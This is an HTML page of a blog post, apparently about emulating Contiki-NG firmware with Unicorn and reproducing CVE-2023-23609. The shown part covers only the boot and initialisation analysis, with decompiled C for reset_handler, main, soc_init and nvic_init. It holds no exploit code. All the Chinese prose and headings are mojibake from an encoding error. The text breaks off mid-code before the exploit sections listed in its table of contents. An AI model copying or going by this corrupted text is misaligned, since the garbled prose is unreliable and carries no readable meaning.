<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Contiki Re-hosting Â∞èËÆ∞ - Stay Hungry</title><meta name="Description" content="This is My New Hugo Site"><meta property="og:title" content="Contiki Re-hosting Â∞èËÆ∞" />
<meta property="og:description" content="Êú¨ÊñáËÆ∞ÂΩïÂ¶Ç‰ΩïÁî® Unicorn Ê®°ÊãüÊâßË°åÊìç‰ΩúÁ≥ªÁªü Contiki-NGÔºåÂπ∂Âú®‰∏äÈù¢Â§çÁé∞Âπ∂Âà©Áî® CVE-2023-23609 ÁöÑÊïÖ‰∫ã„ÄÇ" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://xidoo.top/2023/09/re-host/" /><meta property="og:image" content="http://xidoo.top/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-27T20:25:19+02:00" />
<meta property="article:modified_time" content="2023-09-27T20:25:19+02:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://xidoo.top/logo.png"/>

<meta name="twitter:title" content="Contiki Re-hosting Â∞èËÆ∞"/>
<meta name="twitter:description" content="Êú¨ÊñáËÆ∞ÂΩïÂ¶Ç‰ΩïÁî® Unicorn Ê®°ÊãüÊâßË°åÊìç‰ΩúÁ≥ªÁªü Contiki-NGÔºåÂπ∂Âú®‰∏äÈù¢Â§çÁé∞Âπ∂Âà©Áî® CVE-2023-23609 ÁöÑÊïÖ‰∫ã„ÄÇ"/>
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://xidoo.top/2023/09/re-host/" /><link rel="prev" href="http://xidoo.top/2023/05/rev_main/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Contiki Re-hosting Â∞èËÆ∞",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/xidoo.top\/2023\/09\/re-host\/"
        },"genre": "posts","wordcount":  3384 ,
        "url": "http:\/\/xidoo.top\/2023\/09\/re-host\/","datePublished": "2023-09-27T20:25:19+02:00","dateModified": "2023-09-27T20:25:19+02:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "x1do0"
            },"description": ""
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Stay Hungry">üö© Stay hungry</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/friends/"> Friends </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Stay Hungry">üö© Stay hungry</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/friends/" title="">Friends</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">Contiki Re-hosting Â∞èËÆ∞</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>x1do0</a></span>&nbsp;<span class="post-category">included in <a href="/categories/general/"><i class="far fa-folder fa-fw"></i>General</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-09-27">2023-09-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3384 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;16 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#binary-ÂàÜÊûê">binary ÂàÜÊûê</a>
      <ul>
        <li>
          <ul>
            <li><a href="#arm-cortex-m3-boot">ARM Cortex-M3 boot</a></li>
            <li><a href="#main">main</a></li>
            <li><a href="#‰∏Ä‰∫õÈ¢òÂ§ñËØù">‰∏Ä‰∫õÈ¢òÂ§ñËØùÔºü</a>
              <ul>
                <li>
                  <ul>
                    <li><a href="#dma">DMA</a></li>
                    <li><a href="#‰∏≠Êñ≠">‰∏≠Êñ≠</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#re-host">Re-host</a>
      <ul>
        <li>
          <ul>
            <li><a href="#ÂáÜÂ§áÂ∑•‰Ωú">ÂáÜÂ§áÂ∑•‰Ωú</a>
              <ul>
                <li>
                  <ul>
                    <li><a href="#extract-raw-binary">extract raw binary</a></li>
                    <li><a href="#arm-cortex-m3-memory-layout">ARM Cortex-M3 memory layout</a></li>
                    <li><a href="#Â¶Ç‰ΩïÊ®°Êãü‰∏≠Êñ≠">Â¶Ç‰ΩïÊ®°Êãü‰∏≠Êñ≠</a></li>
                    <li><a href="#Â¶Ç‰ΩïÊ®°ÊãüÁ°¨‰ª∂">Â¶Ç‰ΩïÊ®°ÊãüÁ°¨‰ª∂</a></li>
                    <li><a href="#Â¶Ç‰ΩïË∑≥ËøáÊüê‰∫õÂáΩÊï∞">Â¶Ç‰ΩïË∑≥ËøáÊüê‰∫õÂáΩÊï∞Ôºü</a></li>
                  </ul>
                </li>
              </ul>
            </li>
            <li><a href="#Ê®°ÊãüÁ®ãÂ∫èÂπ∂‰∫ßÁîü‰∏Ä‰∏™-reset-‰∏≠Êñ≠">Ê®°ÊãüÁ®ãÂ∫èÔºåÂπ∂‰∫ßÁîü‰∏Ä‰∏™ reset ‰∏≠Êñ≠</a></li>
            <li><a href="#Ëß¶ÂèëÊõ¥Â§ö‰∏≠Êñ≠Â§çÁé∞-cve-2023-23609">Ëß¶ÂèëÊõ¥Â§ö‰∏≠Êñ≠ÔºåÂ§çÁé∞ CVE-2023-23609</a>
              <ul>
                <li>
                  <ul>
                    <li><a href="#Â¶Ç‰ΩïËµ∞Âà∞ÊºèÊ¥ûÂáΩÊï∞">Â¶Ç‰ΩïËµ∞Âà∞ÊºèÊ¥ûÂáΩÊï∞</a></li>
                    <li><a href="#Â¶Ç‰ΩïËß¶ÂèëÊºèÊ¥û">Â¶Ç‰ΩïËß¶ÂèëÊºèÊ¥û</a></li>
                    <li><a href="#ÊéßÂà∂-pc">ÊéßÂà∂ PC</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#ÁªìÊùü‰∫ÜÂêó">ÁªìÊùü‰∫ÜÂêóÔºü</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>Êú¨ÊñáËÆ∞ÂΩïÂ¶Ç‰ΩïÁî® Unicorn Ê®°ÊãüÊâßË°åÊìç‰ΩúÁ≥ªÁªü Contiki-NGÔºåÂπ∂Âú®‰∏äÈù¢Â§çÁé∞Âπ∂Âà©Áî® CVE-2023-23609 ÁöÑÊïÖ‰∫ã„ÄÇ</p>
<h2 id="binary-ÂàÜÊûê">binary ÂàÜÊûê</h2>
<p>Ëøô‰∏™ <a href="../../../file/hello-world.elf" rel="">binary</a> ÊòØ‰∏Ä‰∏™Âõ∫‰ª∂ÔºàOSÔºâÔºåÂπ∂‰∏çÊòØ‰ª•ÂâçÂàÜÊûêÁöÑÂ∫îÁî®Á®ãÂ∫èÔºåÊâÄ‰ª•ÈúÄË¶ÅÊîπÂèòËßÜËßíÔºåÂØπ‰ª£Á†Å‰∏≠Âá∫Áé∞ÁöÑÊìç‰ΩúÁ≥ªÁªüÂ±ÇÈù¢ÁöÑÂ∑•‰ΩúË¶ÅÊïèÊÑüÁÇπ„ÄÇ</p>
<h4 id="arm-cortex-m3-boot">ARM Cortex-M3 boot</h4>
<p>Êó¢ÁÑ∂ÂÆÉÊòØ‰∏Ä‰∏™Êìç‰ΩúÁ≥ªÁªüÔºåÈÇ£‰πàÂú® boot ÁöÑÊó∂ÂÄôÂ∞±ÂøÖÈ°ªÈÅµÂÆà ARM Cortex-M3 Âπ≥Âè∞ÁöÑËßÑÂàô„ÄÇÂ§ç‰π†‰∏Ä‰∏ãÁ≥ªÁªüËØæ‰∏≠Â≠¶Âà∞ÁöÑ x86 Êìç‰ΩúÁ≥ªÁªüÁöÑÂêØÂä®ËøáÁ®ãÔºöÊåâ‰∏ãÁîµÊ∫êÔºåBOIS ÊääÁ°¨Áõò‰∏≠ÁöÑÂêØÂä®ÊâáÂå∫Êê¨Âà∞ÂÜÖÂ≠òÁöÑ 0xFFFFFFF0 ÔºàÊàñÊòØÊõ¥ËÄ≥ÁÜüÁöÑ 0x7C00ÔºâÂ§ÑÔºåÂºÄÂßã‰ªéËøô‰∏™Âú∞ÂùÄÊâßË°å„ÄÇ</p>
<p>Âú® ARM Cortex-M3 ‰∏≠Ôºå‰∏≠Êñ≠ÂêëÈáèË°®‰ºöË¢´Êò†Â∞ÑÂà∞ 0 Âú∞ÂùÄÂ§ÑÔºåboot ‰ª£Á†ÅÂÅö‰∫ÜËøô‰∫õ‰∫ãÊÉÖÔºöÂéª 0 Âú∞ÂùÄÂ§ÑÊ£ÄÁ¥¢Ëøô‰∏™Ë°®ÔºåÂ∞ÜÁ¨¨‰∏Ä‰∏™Ë°®È°πÁöÑÂÄºËµãÁªô spÔºåÁ¨¨‰∫å‰∏™Ë°®È°πÔºà‰πüÂ∞±ÊòØ reset handlerÔºâÁöÑÂÄºËµãÁªô ip„ÄÇËøôÊ†∑ÁöÑÁõÆÁöÑÊòØ reset handler ÂèØ‰ª•Áî® C ÂÜôÔºåÂõ†‰∏∫Âú® reset handler Êó∂Ê†àÂ∑≤ÁªèÂàùÂßãÂåñÂ•Ω‰∫Ü„ÄÇÂèÇËßÅ <a href="https://developer.arm.com/documentation/ka001328/latest/" target="_blank" rel="noopener noreffer">arm ÂÆòÊñπ docs</a> ‰∏é <a href="https://stackoverflow.com/questions/6139952/what-is-the-booting-process-for-arm" target="_blank" rel="noopener noreffer">what-is-the-booting-process-for-arm</a>„ÄÇ</p>
<p><code>_text</code> Ëµ∑ÂßãÂ§ÑÔºà0x00202000ÔºâÂ∞±ÊòØ‰∏≠Êñ≠ÂêëÈáèË°®Ôºà‰∏≠Êñ≠ÂêëÈáèË°®ÊØè‰∏™Ë°®È°πÊòØ‰ªÄ‰πàÔºåÂú®Âπ≥Âè∞‰∏äÊòØÊúâ<a href="https://developer.arm.com/documentation/dui0552/a/the-cortex-m3-processor/exception-model/vector-table?lang=en" target="_blank" rel="noopener noreffer">ËßÑÂÆö</a>ÁöÑÔºâÔºåÂÆÉÁöÑÁ¨¨‰∏Ä‰∏™Ë°®È°πÊòØ <code>_end</code>ÔºåÁ¨¨‰∫å‰∏™Ë°®È°πÊòØ <code>reset_handler</code>ÔºåÂç∞ËØÅ‰∫ÜÂâçÈù¢ÁöÑËØ¥Ê≥ï„ÄÇÁÇπÂºÄ <code>reset_handler</code> ÂèëÁé∞ÂÆÉÊòØËøôÊ†∑ÁöÑÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="n">__noreturn</span> <span class="nf">reset_handler</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// r0
</span><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// r1
</span><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// r2
</span><span class="c1"></span>
  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x400D20B4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ble_l2cap_tx_process</span><span class="p">,</span> <span class="mh">0x214920</span><span class="p">,</span> <span class="mh">0x362u</span><span class="p">);</span>  <span class="c1">// data
</span><span class="c1"></span>  <span class="n">v0</span> <span class="o">=</span> <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rt_ticks_epoch</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x29EC</span><span class="p">);</span>          <span class="c1">// bss
</span><span class="c1"></span>  <span class="n">main</span><span class="p">(</span><span class="n">v0</span><span class="p">,</span> <span class="n">v1</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>È¶ñÂÖàÁñë‰ººÊòØÂ∞Ü‰ªÄ‰πàÂØÑÂ≠òÂô®ËÆæÁΩÆ‰∏∫ 255. ÁÑ∂Âêé‰∏Ä‰∏™ memcpy ‰∏Ä‰∏™ memset„ÄÇ‰ªîÁªÜËßÇÂØüÂèØ‰ª•ÂèëÁé∞Ôºå<code>ble_l2cap_tx_process</code> ÂÖ∂ÂÆûÊòØ <code>.data</code> ÁöÑËµ∑ÂßãÂ§ÑÔºå<code>rt_ticks_epoch</code> ÊòØ <code>.bss</code> ÁöÑËµ∑ÂßãÂ§Ñ„ÄÇÊâÄ‰ª•ÂÖ∂ÂÆûÊòØ‰ªé flashÔºàÊò†Â∞ÑÂà∞Âú∞ÂùÄÁ©∫Èó¥ <code>0x214920</code>Ôºâ ÈáåÊääÊï∞ÊçÆÊã∑Ë¥ùÂà∞ <code>.data</code> ÊÆµÔºåÂπ∂‰∏îÊää <code>.bss</code> ÊÆµÊ∏ÖÈõ∂„ÄÇ</p>
<blockquote>
<p>mqa: Âπ≥Êó∂ËØ¥ÁöÑÊää‰ª£Á†ÅÁÉßËøõÊùøÂ≠êÔºåÂÖ∂ÂÆûÊòØÊã∑Ë¥ùËøõ flashÔºàÂ§ñÈÉ®Â≠òÂÇ®Âô®ÔºåÁ±ª‰ºº‰∫éÁ°¨ÁõòÔºâ„ÄÇÂµåÂÖ•ÂºèÁ≥ªÁªüÊØîËæÉÁ•ûÂ•áÁöÑ‰∏Ä‰∏™ÁÇπÊòØÔºå‰ª£Á†ÅÂèØ‰ª•Áõ¥Êé•Âú® flash ÈáåËøêË°åÔºàÂèØ‰ª•ÊÉ≥Ë±°Êàê‰ª£Á†ÅÂèØ‰ª•Áõ¥Êé•Âú®Á°¨ÁõòÈáåË∑ëÔºâ„ÄÇ‰ΩÜÊòØÁ†ÅËÉΩÁõ¥Êé•Ë∑ëÔºåÊï∞ÊçÆÊÆµËøòÊòØÂæóÊîæËøõÂÜÖÂ≠òÈáåÔºåÊâÄ‰ª•ÈúÄË¶ÅÊääÊï∞ÊçÆÊÆµ‰ªé flash ÈáåÊã∑Ë¥ùËøõÊù•„ÄÇËá≥‰∫éÊ∏ÖÈõ∂ .bss ÊÆµÂ∞±Êõ¥Ê≠£Â∏∏‰∫ÜÔºåÂõ†‰∏∫ËøôÂ∞±ÊòØÊìç‰ΩúÁ≥ªÁªüËØ•Âπ≤ÁöÑ‰∫ãÂÑøÔºåÂÆÉ‰∏çÂÉè Linux Â∑≤ÁªèÊääÈ°µÁÆ°ÁêÜÊäΩË±°Â•Ω‰∫ÜÔºå.bss ÊÆµÂàÜÈÖçÂá∫Êù•Â∞±ÊòØÈõ∂È°µ„ÄÇ</p>
</blockquote>
<p>ÁúüÊòØË±ÅÁÑ∂ÂºÄÊúóÔºåËøôÊ†∑Êàë‰ª¨Â∞±Ëµ∞Âà∞‰∫Ü main ÂáΩÊï∞„ÄÇ</p>
<h4 id="main">main</h4>
<p>Êé•‰∏ãÊù•ÁúãÁúã main ÈáåÂπ≤‰∫ÜÂï•ÔºåÈ¶ñÂÖàÂ∞±ÊòØ‰∏ÄÂ†Ü‰∏çÊòéÊâÄ‰ª•ÁöÑÁ°¨‰ª∂‰∏éËΩØ‰ª∂ÂàùÂßãÂåñËøáÁ®ã„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">uip_ds6_addr_t</span> <span class="o">*</span><span class="n">link_local</span><span class="p">;</span> <span class="c1">// r4
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// r4
</span><span class="c1"></span>
  <span class="n">platform_init_stage_one</span><span class="p">();</span>
  <span class="n">clock_init</span><span class="p">();</span>
  <span class="n">rtimer_init</span><span class="p">();</span>
  <span class="n">process_init</span><span class="p">();</span>
  <span class="n">process_start</span><span class="p">(</span><span class="o">&amp;</span><span class="n">etimer_process</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">ctimer_init</span><span class="p">();</span>
  <span class="n">watchdog_init</span><span class="p">();</span>
  <span class="n">energest_init</span><span class="p">();</span>
  <span class="n">stack_check_init</span><span class="p">();</span>
  <span class="n">platform_init_stage_two</span><span class="p">();</span>
  <span class="n">queuebuf_init</span><span class="p">();</span>
  <span class="n">netstack_init</span><span class="p">();</span>
  <span class="n">node_id_init</span><span class="p">();</span>
  <span class="p">...</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Ê≤°ÊúâÂ§™Â§öËØ¥Ê≥ïÔºåÁ®çÂæÆËØ¥ËØ¥Áü•ÈÅìÁöÑ‰∏úË•øÔºà‰∏ªË¶ÅÊòØÁü•ÈÅìÁöÑ‰∏úË•ø‰πü‰∏çÂ§öÔºâ„ÄÇwatchdog ÊòØÁ°¨‰ª∂„ÄÇÁÑ∂Âêé <code>platform_init_stage_one</code> ÁÇπËøõÂéªÊúâ‰∏Ä‰∏™ <code>soc_init</code>ÔºåËá™Â¶ÇÂÖ∂ÂêçÂ∞±ÊòØ System of Chips ÂàùÂßãÂåñ„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">soc_init</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">nvic_init</span><span class="p">();</span>
  <span class="n">ioc_init</span><span class="p">();</span>
  <span class="n">sys_ctrl_init</span><span class="p">();</span>
  <span class="n">clock_init</span><span class="p">();</span>
  <span class="n">lpm_init</span><span class="p">();</span>
  <span class="n">rtimer_init</span><span class="p">();</span>
  <span class="n">gpio_hal_init</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>ÈáåÈù¢ <code>nvic_init</code> ÊòØÊää‰∏≠Êñ≠ÂêëÈáèË°®Â§¥ËµãÂÄºÁªô‰∏Ä‰∏™ NVIC ÂØÑÂ≠òÂô®ÔºàÂÜÖÂ≠òÊò†Â∞ÑÂà∞‰∫Ü 0xE000ED08ÔºâÔºåÂÖ∑‰ΩìÊòØÂì™‰∏™ÂØÑÂ≠òÂô®ÈÉΩÂèØ‰ª•Âú® CorTex-M3 ÊâãÂÜåÈáåÊü•Âà∞„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">nvic_init</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0xE000ED08</span><span class="p">]</span> <span class="o">=</span> <span class="n">text</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>ioc ‰∏çÁü•ÈÅìÊòØ‰ªÄ‰πàÁöÑÁº©ÂÜôÔºålpm ‰∏çÁü•ÈÅìÊòØ‰ªÄ‰πàÁöÑÁº©ÂÜôÔºågpio_hal ÊåáÁöÑÊòØ gpio Á°¨‰ª∂ÊäΩË±°Â±ÇÔºà‰∏ÄËà¨ÊòØ‰∏çÂêåÁ°¨‰ª∂ÂéÇÂïÜÈÄ†Âá∫Êù•ÁöÑ‰∏ÄÂ±ÇÊäΩË±°Ôºå‰ΩøÂæó‰∏äÂ±ÇÊé•Âè£‰∏ÄËá¥ÔºåÂπ∂Êó†ÈúÄÂÖ≥ÂøÉ‰∏ãÂ±ÇÁ°¨‰ª∂ÁªÜËäÇÔºâ„ÄÇgpio ÊòØ‰ªÄ‰πà‰∏çÁü•ÈÅì„ÄÇ</p>
<p>ÂèçÊ≠£‰∏ÄÁ≥ªÂàóÂàùÂßãÂåñ‰ª•ÂêéÔºåÂõ∫‰ª∂ÊâìÂç∞Âá∫ÁâàÊú¨‰ø°ÊÅØ <code>Starting Contiki-NG-release/v4.9-11-gfd7139694</code> Á≠â„ÄÇÁÑ∂ÂêéÊù•ÂàÜÊûê‰∏Ä‰∏ãÂÆÉÊâßË°å‰∫ÜÂì™‰∫õ‰∏úË•ø„ÄÇ</p>
<p>ÊúÄÂºÄÂßãÁöÑ‰∏Ä‰∏™ <code>process_start</code> ÂêØÂä®ÁöÑÊòØ tcpip_process„ÄÇÂêéÁª≠ <code>autostart_start</code> Êå®‰∏™ÂÑøÂêØÂä®ÁöÑ <code>autostart_processes</code> ÂàóË°®ÈáåÁöÑËøõÁ®ãÔºåÂÆûÈôÖ‰∏äÈáåÈù¢Â∞±‰∏Ä‰∏™ hello_world_process„ÄÇËøô‰∏§‰∏™ process ÈÉΩÁî±‰∏Ä‰∏™ÁªìÊûÑ‰ΩìË°®Á§∫ÔºåÊàêÂëòÂèòÈáèÈáåËÆ∞ÂΩï‰∫Ü entry pointÔºåÂØπÂ∫îÂú∞ÂùÄÂ∞±ÊòØË¶ÅÊâßË°åÁöÑÂáΩÊï∞ÔºåÂÖ∑‰ΩìÂ¶Ç‰∏ãÔºå‰∏çÊòéÊâÄ‰ª•„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="kr">__fastcall</span> <span class="nf">process_thread_hello_world_process</span><span class="p">(</span><span class="n">pt</span> <span class="o">*</span><span class="n">process_pt</span><span class="p">,</span> <span class="n">process_event_t</span> <span class="n">ev</span><span class="p">,</span> <span class="n">process_data_t</span> <span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">etimer_set</span><span class="p">(</span><span class="o">&amp;</span><span class="n">timer_0</span><span class="p">,</span> <span class="mh">0x500u</span><span class="p">);</span>
    <span class="k">goto</span> <span class="n">LABEL_6</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">==</span> <span class="mi">60</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">etimer_expired</span><span class="p">(</span><span class="o">&amp;</span><span class="n">timer_0</span><span class="p">)</span> <span class="p">)</span>
      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">etimer_reset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">timer_0</span><span class="p">);</span>
<span class="nl">LABEL_6</span><span class="p">:</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hello, world&#34;</span><span class="p">);</span>
